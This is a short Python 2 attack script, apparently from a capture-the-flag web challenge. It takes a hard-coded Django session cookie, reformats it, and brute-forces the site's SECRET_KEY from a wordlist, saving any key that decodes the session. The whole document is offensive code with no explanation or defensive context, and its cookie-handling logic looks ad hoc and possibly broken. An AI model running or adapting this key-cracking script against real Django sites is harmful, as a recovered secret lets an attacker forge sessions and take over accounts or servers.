from django.contrib.sessions.backends.db import SessionStore
from django.conf import settings
import sys 
sessionid = "eyJ1c2VyIjoiNTE2NTcxIn0:1YkCiy:ttKWHyPbPnDX8C1Vnw3ee9R8iYU"
sessionid_b64decode = sessionid.decode("base64")
print sessionid_b64decode
hex_str = sessionid_b64decode[(sessionid_b64decode.find("}")+1):]
dict_str = sessionid_b64decode[:sessionid_b64decode.find("}")+1]
sessionid = hex_str.encode("hex") + ':\"' + dict_str + "\""
sessionid = sessionid.encode("base64")
# Fix the sessionid
for key in open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines():
    settings.SECRET_KEY = key.strip()
    print settings.SECRET_KEY
    if SessionStore().decode(sessionid) != {}:
        print "Possible secret key: " + key.strip()
        with open('/home/chesley/Dropbox/tmp/web-d/brute.out', 'a') as f:
            f.write(key.strip())
            sys.exit(0)
